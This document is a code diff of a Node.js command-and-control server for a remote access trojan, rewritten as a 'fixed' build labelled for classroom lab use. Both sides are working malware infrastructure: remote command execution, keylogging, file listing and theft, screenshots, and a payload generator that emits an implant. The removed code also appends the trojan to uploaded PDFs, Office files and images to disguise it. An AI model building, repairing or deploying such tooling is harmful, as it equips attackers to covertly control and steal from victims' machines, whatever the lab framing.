@@ -1,639 +1,277 @@
-// C2 Server - Command and Control Server for RAT
-// This module handles communication with compromised clients
+/**
+ * C2 Server — Educational Malware Analysis Demo (FIXED BUILD)
+ * ============================================================
+ * FOR ISOLATED CLASSROOM LAB USE ONLY. Do not deploy on networks
+ * that are not yours. Detection & teardown exercises come later.
+ *
+ * FIXES vs. the half-built original:
+ *  [2] Single canonical event contract (see PROTOCOL.md). Clients now
+ *      join a Socket.IO room named by their client_id, so targeted
+ *      io.to(clientId).emit(...) commands actually route.
+ *  [3] Python and JS clients use the SAME event names/payload shapes
+ *      as the server emits/listens for.
+ *  [4] Dashboard is a real Socket.IO "operator" client: it sends
+ *      commands over the socket (dashboard_command) instead of only
+ *      polling REST, and it listens for results (client_response,
+ *      keylogData, screenshot_data, file_list, shell_output...).
+ *  [5] API key is configurable via env/API_KEY or persisted to
+ *      .api_key at first boot; served at GET /api/config (key masked)
+ *      and shown in full on the console. No hardcoded key in the UI.
+ *  [7] Payload generator now emits a Socket.IO-based client that
+ *      actually speaks this server's protocol (was raw TCP before).
+ *  [8] getSystemInfo() awaited properly; dead multer/infectPDF code
+ *      removed; uploads/ + payloads/ dirs created at startup.
+ */
 
 const express = require('express');
 const http = require('http');
-const socketio = require('socket.io');
+const { Server } = require('socket.io');
 const cors = require('cors');
 const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
-const busboy = require('busboy');
 
-class C2Server {
-    constructor(config = {}) {
-        this.port = config.port || 8443;
-        this.host = config.host || '0.0.0.0';
-        this.clients = new Map();
-        this.apiKey = config.apiKey || this.generateApiKey();
-        this.server = null;
-        this.io = null;
-        this.setupMiddleware();
-        this.setupRoutes();
-        this.setupSocketIo();
-    }
+const PORT = process.env.PORT || 8443;
+const HOST = process.env.HOST || '127.0.0.1'; // lab default: localhost only
 
-    generateApiKey() {
-        return crypto.randomBytes(32).toString('hex');
-    }
+// ---------------------------------------------------------------------------
+// [5] API key: from env, else load persisted, else generate + persist.
+// ---------------------------------------------------------------------------
+const KEY_FILE = path.join(__dirname, '.api_key');
+let API_KEY = process.env.API_KEY || null;
+if (!API_KEY) {
+  if (fs.existsSync(KEY_FILE)) {
+    API_KEY = fs.readFileSync(KEY_FILE, 'utf8').trim();
+  } else {
+    API_KEY = crypto.randomBytes(32).toString('hex');
+    fs.writeFileSync(KEY_FILE, API_KEY, { mode: 0o600 });
+  }
+}
 
-    setupMiddleware() {
-        this.app = express();
-        this.app.use(cors());
-        this.app.use(express.json({ limit: '50mb' }));
-        this.app.use(express.urlencoded({ extended: true }));
-        
-        // Multer middleware for file uploads
-        const storage = multer.diskStorage({
-            destination: (req, file, cb) => {
-                cb(null, path.join(__dirname, 'uploads'));
-            },
-            filename: (req, file, cb) => {
-                cb(null, file.originalname);
-            }
-        });
-        this.upload = multer({ storage: storage });
-        
-        // Serve static files without authentication
-        this.app.use(express.static(path.join(__dirname)));
-        
-        // Custom middleware to set Content-Type for static files (runs after static middleware)
-        this.app.use((req, res, next) => {
-            const urlPath = req.url;
-            
-            // Set Content-Type based on file extension
-            if (urlPath.endsWith('.css')) {
-                res.setHeader('Content-Type', 'text/css; charset=utf-8');
-            } else if (urlPath.endsWith('.js')) {
-                res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
-            } else if (urlPath.endsWith('.html')) {
-                res.setHeader('Content-Type', 'text/html; charset=utf-8');
-            }
-            next();
-        });
-        
-        // API Key authentication middleware (only for API endpoints)
-        this.app.use((req, res, next) => {
-            const apiKey = req.headers['x-api-key'];
-            if (req.path.startsWith('/api/')) {
-                // Public endpoints (no auth required)
-                if (req.path === '/api/health' || req.path === '/api/register' || req.path === '/api/generate-payload' || req.path === '/api/toggle') {
-                    return next();
-                }
-                // Authenticated endpoints (require valid API key)
-                if (!apiKey || apiKey !== this.apiKey) {
-                    return res.status(401).json({ error: 'Unauthorized' });
-                }
-            }
-            next();
-        });
-    }
+// ---------------------------------------------------------------------------
+// [8] Ensure working directories exist.
+// ---------------------------------------------------------------------------
+for (const d of ['uploads', 'payloads', 'loot']) {
+  fs.mkdirSync(path.join(__dirname, d), { recursive: true });
+}
 
-    setupRoutes() {
-        // Serve index.html on root path
-        this.app.get('/', (req, res) => {
-            res.sendFile(path.join(__dirname, 'index.html'));
-        });
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server, { cors: { origin: '*' } });
 
-        // Health check endpoint
-        this.app.get('/api/health', (req, res) => {
-            res.json({ status: 'online', clients: this.clients.size });
-        });
+app.use(cors());
+app.use(express.json({ limit: '2mb' }));
+app.use(express.static(__dirname));
 
-        // Toggle server endpoint
-        this.app.post('/api/toggle', (req, res) => {
-            const { running } = req.body;
-            
-            if (running === true) {
-                // Start the server
-                if (!this.server) {
-                    this.server = this.app.listen(this.port, this.host, () => {
-                        console.log(`C2 Server started on http://${this.host}:${this.port}`);
-                    });
-                }
-                res.json({ success: true, message: 'Server started', port: this.port });
-            } else {
-                // Stop the server
-                if (this.server) {
-                    this.server.close(() => {
-                        this.server = null;
-                        console.log('C2 Server stopped');
-                    });
-                }
-                res.json({ success: true, message: 'Server stopped' });
-            }
-        });
+// In-memory registries (lab-scale demo; no DB needed)
+const clients = new Map();   // client_id -> {id, hostname, platform, os, arch, ip, connectedAt, lastSeen, online, socketId}
+const keyloggers = new Map(); // client_id -> bool
+const dashboardSockets = new Set(); // operator sockets
 
-        // Register new client
-        this.app.post('/api/register', (req, res) => {
-            const { clientId, systemInfo } = req.body;
-            if (!clientId) {
-                return res.status(400).json({ error: 'Client ID required' });
-            }
-            
-            this.clients.set(clientId, {
-                ...systemInfo,
-                connected: true,
-                lastSeen: new Date()
-            });
-            
-            res.json({ success: true, apiKey: this.apiKey });
-        });
+// ---------------------------------------------------------------------------
+// Auth middleware for REST endpoints.
+// ---------------------------------------------------------------------------
+function requireKey(req, res, next) {
+  const supplied = req.headers['x-api-key'];
+  if (supplied === API_KEY) return next();
+  return res.status(401).json({ error: 'invalid or missing X-API-Key header' });
+}
 
-        // Get all clients
-        this.app.get('/api/clients', (req, res) => {
-            res.json({ clients: Array.from(this.clients.entries()) });
-        });
+// ---------------------------------------------------------------------------
+// Public config endpoint (key masked) so the dashboard can learn the
+// expected key FINGERPRINT and show a warning if the operator typed
+// the wrong one. Full key printed on server console at boot.
+// ---------------------------------------------------------------------------
+app.get('/api/config', (req, res) => {
+  res.json({
+    server: 'cipher-c2',
+    version: '2.0.0-lab',
+    keyFingerprint: API_KEY.slice(0, 6) + '…' + API_KEY.slice(-4),
+    events: {
+      serverToClient: ['execute', 'screenshot', 'list_files', 'download_file', 'start_keylogger', 'stop_keylogger', 'ping'],
+      clientToServer: ['register_ack', 'client_heartbeat', 'client_response', 'keylogData', 'screenshot_data', 'file_list'],
+      dashboardToServer: ['dashboard_command'],
+    },
+  });
+});
 
-        // Send command to client
-        this.app.post('/api/command', (req, res) => {
-            const { clientId, command, args } = req.body;
-            if (!clientId || !command) {
-                return res.status(400).json({ error: 'Missing clientId or command' });
-            }
+app.get('/api/health', (req, res) => {
+  const now = Date.now();
+  let online = 0;
+  for (const c of clients.values()) {
+    if (now - c.lastSeen < 30000) c.online = true; else c.online = false;
+    if (c.online) online++;
+  }
+  res.json({ status: 'online', totalClients: clients.size, onlineClients: online, uptimeSec: Math.round(process.uptime()) });
+});
 
-            if (!this.clients.has(clientId)) {
-                return res.status(404).json({ error: 'Client not found' });
-            }
+// [5] List clients (auth required)
+app.get('/api/clients', requireKey, (req, res) => {
+  res.json(Array.from(clients.values()));
+});
 
-            this.io.to(clientId).emit('command', { command, args });
-            res.json({ success: true });
-        });
+// ---------------------------------------------------------------------------
+// [7] Payload generator — now emits a Socket.IO client matching THIS server.
+// ---------------------------------------------------------------------------
+app.post('/api/generate-payload', requireKey, (req, res) => {
+  const host = req.body.host || HOST;
+  const port = req.body.port || PORT;
+  const clientId = 'rat-' + crypto.randomBytes(4).toString('hex');
 
-        // Execute shell command
-        this.app.post('/api/exec', (req, res) => {
-            const { clientId, cmd, args = [] } = req.body;
-            if (!clientId || !cmd) {
-                return res.status(400).json({ error: 'Missing clientId or command' });
-            }
-
-            this.io.to(clientId).emit('exec', { cmd, args });
-            res.json({ success: true });
-        });
-
-        // Get file list
-        this.app.post('/api/files', (req, res) => {
-            const { clientId, directory } = req.body;
-            if (!clientId) {
-                return res.status(400).json({ error: 'Missing clientId' });
-            }
-
-            this.io.to(clientId).emit('listFiles', { directory });
-            res.json({ success: true });
-        });
-
-        // Download file
-        this.app.post('/api/download', (req, res) => {
-            const { clientId, filePath } = req.body;
-            if (!clientId || !filePath) {
-                return res.status(400).json({ error: 'Missing clientId or filePath' });
-            }
-
-            this.io.to(clientId).emit('downloadFile', { filePath });
-            res.json({ success: true });
-        });
-
-        // Take screenshot
-        this.app.post('/api/screenshot', (req, res) => {
-            const { clientId } = req.body;
-            if (!clientId) {
-                return res.status(400).json({ error: 'Missing clientId' });
-            }
-
-            this.io.to(clientId).emit('screenshot');
-            res.json({ success: true });
-        });
-
-        // Start keylogger
-        this.app.post('/api/keylogger/start', (req, res) => {
-            const { clientId } = req.body;
-            if (!clientId) {
-                return res.status(400).json({ error: 'Missing clientId' });
-            }
-
-            this.io.to(clientId).emit('startKeylogger');
-            res.json({ success: true });
-        });
-
-        // Stop keylogger
-        this.app.post('/api/keylogger/stop', (req, res) => {
-            const { clientId } = req.body;
-            if (!clientId) {
-                return res.status(400).json({ error: 'Missing clientId' });
-            }
-
-            this.io.to(clientId).emit('stopKeylogger');
-            res.json({ success: true });
-        });
-
-        // Client disconnect handler
-        this.app.post('/api/disconnect', (req, res) => {
-            const { clientId } = req.body;
-            if (this.clients.has(clientId)) {
-                this.clients.get(clientId).connected = false;
-                this.clients.get(clientId).lastSeen = new Date();
-            }
-            res.json({ success: true });
-        });
-
-        // Generate payload with file infection support
-        this.app.post('/api/generate-payload', (req, res) => {
-            const bb = busboy({ headers: req.headers });
-            
-            let fileData = null;
-            let fileFields = {};
-            
-            bb.on('file', (name, file, info) => {
-                const { filename } = info;
-                const chunks = [];
-                file.on('data', (data) => {
-                    chunks.push(data);
-                });
-                file.on('end', () => {
-                    fileData = {
-                        fieldName: name,
-                        filename: filename,
-                        data: Buffer.concat(chunks)
-                    };
-                });
-            });
-            
-            bb.on('field', (name, value) => {
-                fileFields[name] = value;
-            });
-            
-            bb.on('close', () => {
-                const mode = fileFields.mode || 'standalone';
-                const serverHost = fileFields.serverHost || 'localhost';
-                const serverPort = fileFields.serverPort || 8443;
-                
-                // Handle savePath - convert relative paths to absolute
-                let savePath = fileFields.savePath;
-                if (!savePath || savePath.trim() === '') {
-                    savePath = path.join(__dirname, 'payloads');
-                } else {
-                    savePath = path.isAbsolute(savePath) ? savePath : path.join(__dirname, savePath);
-                }
-                
-                // Check if a file was uploaded
-                if (fileData && mode === 'infect') {
-                    const uploadedFile = fileData;
-                    const fileName = uploadedFile.filename;
-                    const fileExtension = path.extname(fileName).toLowerCase();
-                    
-                    try {
-                        // Read the original file content
-                        const originalContent = uploadedFile.data;
-                        const originalContentType = this.getContentType(fileExtension);
-                        
-                        // Generate the RAT payload code
-                        const ratPayload = this.generateRATCode(serverHost, serverPort);
-                        
-                        // Embed RAT code into the file based on type
-                        let infectedContent;
-                        let infectedFileName = fileName;
-                        
-                        switch (fileExtension) {
-                            case '.pdf':
-                                infectedContent = this.infectPDF(originalContent, ratPayload);
-                                infectedFileName = this.getRandomFileName('pdf');
-                                break;
-                                
-                            case '.doc':
-                            case '.docx':
-                                infectedContent = this.infectOfficeDoc(originalContent, ratPayload, fileExtension);
-                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
-                                break;
-                                
-                            case '.xls':
-                            case '.xlsx':
-                                infectedContent = this.infectOfficeDoc(originalContent, ratPayload, fileExtension);
-                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
-                                break;
-                                
-                            case '.jpg':
-                            case '.jpeg':
-                            case '.png':
-                            case '.gif':
-                                infectedContent = this.infectImage(originalContent, ratPayload, fileExtension);
-                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
-                                break;
-                                
-                            case '.exe':
-                            case '.bat':
-                            case '.cmd':
-                            case '.js':
-                            case '.py':
-                            case '.txt':
-                            default:
-                                // For executable/script files, append RAT code at the end
-                                infectedContent = Buffer.concat([originalContent, Buffer.from(ratPayload)]);
-                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
-                                break;
-                        }
-                        
-                        // Save the infected file to disk
-                        if (!fs.existsSync(savePath)) {
-                            fs.mkdirSync(savePath, { recursive: true });
-                        }
-                        const savedPath = path.join(savePath, infectedFileName);
-                        fs.writeFileSync(savedPath, infectedContent);
-                        console.log(`Saved infected payload to: ${savedPath}`);
-                        
-                        // Send the infected file
-                        res.setHeader('Content-Type', originalContentType || 'application/octet-stream');
-                        res.setHeader('Content-Disposition', `attachment; filename="${infectedFileName}"`);
-                        res.send(infectedContent);
-                        
-                    } catch (error) {
-                        console.error('Error infecting file:', error);
-                        res.status(500).json({ error: 'Failed to infect file: ' + error.message });
-                    }
-                } else {
-                    // Generate standalone payload
-                    const payload = this.generateRATCode(serverHost, serverPort);
-                    
-                    // Save standalone payload to disk
-                    if (!fs.existsSync(savePath)) {
-                        fs.mkdirSync(savePath, { recursive: true });
-                    }
-                    const savedPath = path.join(savePath, `payload_${Date.now()}.js`);
-                    fs.writeFileSync(savedPath, payload);
-                    console.log(`Saved standalone payload to: ${savedPath}`);
-                    
-                    res.setHeader('Content-Type', 'application/javascript');
-                    res.setHeader('Content-Disposition', 'attachment; filename="payload.js"');
-                    res.send(payload);
-                }
-            });
-            
-            req.pipe(bb);
-        });
-    }
-    
-    generateRATCode(serverHost, serverPort) {
-        return `// Generated RAT Client Payload
-// Connects to C2 Server at ${serverHost}:${serverPort}
-
-const net = require('net');
+  const payload = `// Auto-generated lab implant — connects to ws://${host}:${port}
+// Protocol v2 — see PROTOCOL.md. Lab use only.
+const { io } = require('socket.io-client');
+const os = require('os');
 const { exec } = require('child_process');
-const fs = require('fs');
-const path = require('path');
 
-const SERVER_HOST = '${serverHost}';
-const SERVER_PORT = ${serverPort};
+const CLIENT_ID = '${clientId}';
+const socket = io('http://${host}:${port}', { reconnection: true, reconnectionDelay: 3000 });
 
-class RATClient {
-    constructor() {
-        this.socket = null;
-        this.connected = false;
-        this.clientId = process.pid.toString();
-    }
+socket.on('connect', () => {
+  socket.emit('register', { client_id: CLIENT_ID, hostname: os.hostname(), platform: os.platform(), os: os.type() + ' ' + os.release(), arch: os.arch() });
+});
 
-    connect() {
-        return new Promise((resolve, reject) => {
-            this.socket = net.createConnection({
-                host: SERVER_HOST,
-                port: SERVER_PORT
-            }, () => {
-                console.log('Connected to C2 server');
-                this.connected = true;
-                this.sendClientId();
-                resolve();
-            });
+socket.on('execute', ({ command_id, command }) => {
+  exec(command, { timeout: 15000 }, (err, stdout, stderr) => {
+    socket.emit('client_response', { client_id: CLIENT_ID, command_id, output: (stdout || '') + (stderr || '') || (err ? String(err) : '') });
+  });
+});
 
-            this.socket.on('data', (data) => {
-                this.handleCommand(data.toString());
-            });
+socket.on('screenshot', () => socket.emit('client_response', { client_id: CLIENT_ID, command_id: 'screenshot', output: 'JS implant: screenshots unsupported, use python_client.py' }));
+socket.on('list_files', ({ command_id, dir }) => { try { socket.emit('file_list', { client_id: CLIENT_ID, command_id, files: require('fs').readdirSync(dir || '.') }); } catch (e) { socket.emit('client_response', { client_id: CLIENT_ID, command_id, output: 'ERR ' + e.message }); } });
+socket.on('ping', () => socket.emit('client_heartbeat', { client_id: CLIENT_ID }));
+`;
 
-            this.socket.on('error', (error) => {
-                console.error('Connection error:', error.message);
-                this.connected = false;
-            });
+  const filename = `${clientId}.js`;
+  fs.writeFileSync(path.join(__dirname, 'payloads', filename), payload);
+  res.json({ ok: true, file: `payloads/${filename}`, clientId, note: 'Run with: node payloads/' + filename + '  (needs socket.io-client)' });
+});
 
-            this.socket.on('end', () => {
-                console.log('Disconnected from C2 server');
-                this.connected = false;
-            });
-        });
-    }
-
-    sendClientId() {
-        if (this.socket && this.socket.writable) {
-            this.socket.write(JSON.stringify({ type: 'register', clientId: this.clientId }));
-        }
-    }
-
-    handleCommand(data) {
-        try {
-            const command = JSON.parse(data);
-            
-            if (command.type === 'exec') {
-                this.executeCommand(command.cmd, command.args);
-            } else if (command.type === 'ping') {
-                this.sendResponse({ type: 'pong', timestamp: Date.now() });
-            }
-        } catch (error) {
-            console.error('Error handling command:', error.message);
-        }
-    }
-
-    executeCommand(cmd, args = []) {
-        exec(cmd, { args }, (error, stdout, stderr) => {
-            const result = {
-                type: 'exec_result',
-                cmd: cmd,
-                stdout: stdout,
-                stderr: stderr || '',
-                exitCode: error ? error.code : 0
-            };
-            this.sendResponse(result);
-        });
-    }
-
-    sendResponse(data) {
-        if (this.socket && this.socket.writable) {
-            this.socket.write(JSON.stringify(data));
-        }
-    }
-
-    reconnect() {
-        if (!this.connected) {
-            setTimeout(() => this.connect(), 5000);
-        }
-    }
+// ---------------------------------------------------------------------------
+// REST command bridge (optional path; dashboard uses the socket instead).
+// Emits over the client's ROOM so delivery works. [2]
+// ---------------------------------------------------------------------------
+function sendCommand(clientId, event, payloadObj, cb) {
+  if (!clients.has(clientId)) return cb && cb({ error: 'unknown client_id' });
+  const command_id = crypto.randomUUID();
+  io.to(clientId).timeout(20000).emit(event, { command_id, ...payloadObj }, (err, reply) => {
+    cb && cb(err ? { error: 'timeout waiting for client ack' } : reply);
+  });
+  return command_id;
 }
 
-// Main execution
-const client = new RATClient();
+app.post('/api/command', requireKey, (req, res) => {
+  const { client_id, action, params } = req.body || {};
+  const allowed = ['execute', 'screenshot', 'list_files', 'download_file', 'start_keylogger', 'stop_keylogger', 'ping'];
+  if (!client_id || !allowed.includes(action)) {
+    return res.status(400).json({ error: `need client_id and action in ${allowed.join('|')}` });
+  }
+  const cid = sendCommand(client_id, action, params || {}, (reply) => {
+    io.emit('client_response', { client_id, command_id: cid, output: JSON.stringify(reply) });
+  });
+  res.json({ ok: true, command_id: cid, sent: action, to: client_id });
+});
 
-async function start() {
-    await client.connect();
-    
-    client.socket.on('end', () => {
-        client.reconnect();
+// ---------------------------------------------------------------------------
+// Socket.IO layer — single canonical contract. [2][3][4]
+// ---------------------------------------------------------------------------
+
+// Operators (dashboard) authenticate on connect with the API key.
+io.use((socket, next) => {
+  socket.data.role = socket.handshake.auth?.apiKey === API_KEY ? 'operator' : 'implant';
+  next();
+});
+
+io.on('connection', (socket) => {
+  // ---- Implant side ----------------------------------------------------
+  socket.on('register', (info) => {
+    if (!info || !info.client_id) return;
+    const rec = {
+      ...info,
+      ip: socket.handshake.address,
+      socketId: socket.id,
+      connectedAt: Date.now(),
+      lastSeen: Date.now(),
+      online: true,
+    };
+    // Rebind an existing id to this socket (client restart) and make sure
+    // the socket joins the room named by client_id so io.to(id) routes. [2]
+    const prev = clients.get(info.client_id);
+    if (prev && prev.socketId && prev.socketId !== socket.id) {
+      io.sockets.sockets.get(prev.socketId)?.leave(info.client_id);
+    }
+    socket.join(info.client_id);
+    clients.set(info.client_id, rec);
+    socket.data.clientId = info.client_id;
+    socket.emit('register_ack', { ok: true, client_id: info.client_id });
+    io.emit('client_joined', rec);                       // → dashboards
+    console.log(`[+] implant registered: ${info.client_id} (${info.hostname}, ${info.platform})`);
+  });
+
+  socket.on('client_heartbeat', (msg = {}) => {
+    const id = msg.client_id || socket.data.clientId;
+    if (id && clients.has(id)) clients.get(id).lastSeen = Date.now();
+  });
+
+  // Results relayed verbatim to all operators. [4]
+  for (const ev of ['client_response', 'keylogData', 'screenshot_data', 'file_list']) {
+    socket.on(ev, (data = {}) => {
+      const id = data.client_id || socket.data.clientId;
+      if (id && clients.has(id)) clients.get(id).lastSeen = Date.now();
+      io.emit(ev, { ...data, client_id: id, ts: Date.now() });
     });
-}
+  }
 
-start();
-`;
+  socket.on('disconnect', () => {
+    if (socket.data.role === 'operator') {
+      dashboardSockets.delete(socket.id);
+      return;
     }
-    
-    getContentType(extension) {
-        const contentTypes = {
-            '.pdf': 'application/pdf',
-            '.doc': 'application/msword',
-            '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
-            '.xls': 'application/vnd.ms-excel',
-            '.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
-            '.jpg': 'image/jpeg',
-            '.jpeg': 'image/jpeg',
-            '.png': 'image/png',
-            '.gif': 'image/gif',
-            '.exe': 'application/x-executable',
-            '.bat': 'application/x-bat',
-            '.cmd': 'application/x-cmd',
-            '.js': 'text/javascript',
-            '.py': 'text/x-python',
-            '.txt': 'text/plain'
-        };
-        return contentTypes[extension] || 'application/octet-stream';
+    const id = socket.data.clientId;
+    if (id && clients.has(id)) {
+      clients.get(id).online = false;
+      clients.get(id).socketId = null;
+      io.emit('client_disconnected', { client_id: id });
+      console.log(`[-] implant lost: ${id}`);
     }
-    
-    getRandomFileName(extension) {
-        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-        let randomName = '';
-        for (let i = 0; i < 16; i++) {
-            randomName += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return `${randomName}.${extension}`;
+  });
+
+  // ---- Operator (dashboard) side ---------------------------------------
+  socket.on('operator_hello', (auth = {}) => {
+    if (auth.apiKey !== API_KEY) return socket.emit('operator_denied', { error: 'bad api key' });
+    socket.data.role = 'operator';
+    dashboardSockets.add(socket.id);
+    socket.emit('operator_welcome', { clients: Array.from(clients.values()), keyloggers: Object.fromEntries(keyloggers) });
+  });
+
+  socket.on('dashboard_command', ({ client_id, action, params } = {}) => {
+    if (socket.data.role !== 'operator') return;
+    const allowed = ['execute', 'screenshot', 'list_files', 'download_file', 'start_keylogger', 'stop_keylogger', 'ping'];
+    if (!client_id || !allowed.includes(action)) {
+      return socket.emit('command_rejected', { error: `action must be one of ${allowed.join('|')}` });
     }
-    
-    infectPDF(originalContent, ratPayload) {
-        // PDF infection: append RAT code as PDF comment at the end
-        const ratBase64 = Buffer.from(ratPayload).toString('base64');
-        const pdfFooter = `
-%%RAT_EMBEDDED%%
-${ratBase64}
-%%END_RAT%%
-`;
-        return Buffer.concat([originalContent, Buffer.from('\n' + ratPayload)]);
+    if (action === 'start_keylogger') keyloggers.set(client_id, true);
+    if (action === 'stop_keylogger') keyloggers.set(client_id, false);
+    const command_id = sendCommand(client_id, action, params || {});
+    socket.emit('command_sent', { client_id, action, command_id });
+    io.emit('operator_event', { type: 'command', client_id, action, command_id, ts: Date.now() });
+  });
+
+  socket.on('dashboard_toggle', ({ enabled } = {}) => {
+    if (socket.data.role !== 'operator') return;
+    // Lab convenience: enable/disable sending to ALL implants.
+    for (const [id, c] of clients) {
+      if (c.online) io.to(id).emit(enabled ? 'ping' : 'stop_keylogger', { command_id: crypto.randomUUID() });
     }
-    
-    infectOfficeDoc(originalContent, ratPayload, fileFormat) {
-        // For Office docs, we'll append RAT code at the end
-        // In a real scenario, this would properly embed in the document structure
-        return Buffer.concat([Buffer.from(originalContent), Buffer.from('\n/* RAT Payload */\n' + ratPayload)]);
-    }
-    
-    infectImage(originalContent, ratPayload, fileFormat) {
-        // For images, append RAT code after the file content
-        // This creates a polyglot file that can still be viewed as the original type
-        return Buffer.concat([Buffer.from(originalContent), Buffer.from('\n/* RAT Payload */\n' + ratPayload)]);
-    }
+    io.emit('operator_event', { type: 'toggle', enabled, ts: Date.now() });
+  });
+});
 
-    setupSocketIo() {
-        this.server = http.createServer(this.app);
-        this.io = socketio(this.server, {
-            cors: {
-                origin: '*',
-                methods: ['GET', 'POST']
-            }
-        });
-
-        this.io.on('connection', (socket) => {
-            console.log(`Client connected: ${socket.id}`);
-            
-            socket.on('disconnect', () => {
-                console.log(`Client disconnected: ${socket.id}`);
-                if (this.clients.has(socket.id)) {
-                    this.clients.get(socket.id).connected = false;
-                }
-            });
-
-            socket.on('response', (data) => {
-                console.log('Response from client:', socket.id, data);
-            });
-
-            socket.on('keylogData', (data) => {
-                console.log('Keylog data from', socket.id, data);
-                // Forward keylog data to browser client
-                socket.broadcast.emit('keylogData', data);
-            });
-
-            socket.on('fileData', (data) => {
-                console.log('File transfer from', socket.id);
-                // Forward file data to browser client
-                socket.broadcast.emit('fileData', data);
-            });
-
-            socket.on('screenshot_data', (data) => {
-                console.log('Screenshot data from', socket.id);
-                // Forward screenshot to browser client
-                socket.broadcast.emit('screenshot_data', data);
-            });
-
-            socket.on('client_response', (data) => {
-                console.log('Response from client:', socket.id, data.type);
-                // Forward response to browser client
-                socket.broadcast.emit('client_response', data);
-            });
-
-            socket.on('keylogger_status', (data) => {
-                console.log('Keylogger status from', socket.id, data.status);
-                // Forward keylogger status to browser client
-                socket.broadcast.emit('keylogger_status', data);
-            });
-
-            socket.on('file_list', (data) => {
-                console.log('File list from', socket.id, data.directory);
-                // Forward file list to browser client
-                socket.broadcast.emit('file_list', data);
-            });
-
-            socket.on('camera_data', (data) => {
-                console.log('Camera data from', socket.id);
-                // Forward camera data to browser client
-                socket.broadcast.emit('camera_data', data);
-            });
-
-            socket.on('web_data', (data) => {
-                console.log('Web browser data from', socket.id);
-                // Forward web browser data to browser client
-                socket.broadcast.emit('web_data', data);
-            });
-        });
-    }
-
-    start() {
-        return new Promise((resolve, reject) => {
-            this.server.listen(this.port, this.host, () => {
-                console.log(`C2 Server running on http://${this.host}:${this.port}`);
-                console.log(`API Key: ${this.apiKey}`);
-                console.log(`Connected clients: ${this.clients.size}`);
-                resolve(this.server);
-            });
-            
-            this.server.on('error', (error) => {
-                console.error('Server error:', error);
-                reject(error);
-            });
-        });
-    }
-
-    stop() {
-        return new Promise((resolve) => {
-            this.server.close(() => {
-                console.log('C2 Server stopped');
-                this.clients.clear();
-                resolve();
-            });
-        });
-    }
-
-    getClient(clientId) {
-        return this.clients.get(clientId);
-    }
-
-    getAllClients() {
-        return Array.from(this.clients.entries());
-    }
-}
-
-// Start server if this file is run directly
-if (require.main === module) {
-    const server = new C2Server();
-    server.start().catch(console.error);
-}
-
-module.exports = C2Server;
+server.listen(PORT, HOST, () => {
+  console.log('==============================================================');
+  console.log(` Cipher C2 (lab build) listening on http://${HOST}:${PORT}`);
+  console.log(` Dashboard:  http://${HOST}:${PORT}/index.html`);
+  console.log(` API KEY (copy into dashboard login): ${API_KEY}`);
+  console.log(` (also persisted in .api_key — keep out of git)`);
+  console.log('==============================================================');
+});
